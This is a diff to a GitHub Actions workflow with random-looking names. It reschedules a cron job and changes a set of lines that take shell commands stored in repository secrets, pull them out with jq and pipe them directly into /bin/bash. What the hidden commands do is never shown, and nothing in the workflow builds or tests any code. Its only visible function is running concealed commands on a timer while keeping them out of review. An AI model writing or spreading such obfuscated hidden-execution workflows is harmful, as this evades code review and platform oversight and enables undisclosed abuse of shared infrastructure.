@@ -1,8 +1,9 @@
 name: chentihaoda
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 4/6 * * *'
+    - cron: '17 3/6 * * *'
 
 jobs:
   build:
@@ -11,18 +12,9 @@ jobs:
       - uses: actions/checkout@v4
       - name: chentihaoda
         env:
-          rivzh37: ${{ secrets.rivzh37 }}
+          zikls1333: ${{ secrets.zikls1333 }}
         run: |
-          echo $rivzh37 | jq -r .q777 | /bin/bash
-          echo $g12407 | jq -r .om2 | /bin/bash
-          echo $eq97123 | jq -r .ochal2375 | /bin/bash
-          echo $wv6 | jq -r .bts9740 | /bin/bash
-          echo $jphy60980 | jq -r .z335 | /bin/bash
-          echo $qrv4115 | jq -r .oxuov698 | /bin/bash
-          echo $ivy5856 | jq -r .wh1 | /bin/bash
-          echo $qv62286 | jq -r .iglts8250 | /bin/bash
-          echo $evir5 | jq -r .mk766 | /bin/bash
-          echo $xua91514 | jq -r .pcvn20358 | /bin/bash
-          echo $eemog14 | jq -r .gz8523 | /bin/bash
-          echo $q4 | jq -r .cit6675 | /bin/bash
+          echo $zikls1333 | jq -r .rlh77 | /bin/bash
+          echo $ab3001 | jq -r .xcl6 | /bin/bash
+          echo $lr7245 | jq -r .ga219 | /bin/bash
 
